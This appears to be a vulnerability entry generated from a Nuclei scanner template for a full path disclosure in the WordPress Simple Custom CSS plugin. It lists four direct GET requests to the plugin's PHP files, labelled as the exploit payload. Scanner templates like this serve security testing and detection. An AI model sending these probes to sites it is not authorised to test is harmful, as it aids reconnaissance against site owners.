# Vulnerability: WordPress Simple Custom CSS Plugin - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-simple-custom-css-fpd.yaml`)

## Description
Detected WordPress Simple Custom CSS plugin internal file system path was exposed through direct file access.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/simple-custom-css/simple-custom-css.php
GET {{BaseURL}}/wp-content/plugins/simple-custom-css/includes/admin.php
GET {{BaseURL}}/wp-content/plugins/simple-custom-css/includes/public.php
GET {{BaseURL}}/wp-content/plugins/simple-custom-css/includes/customizer.php
```

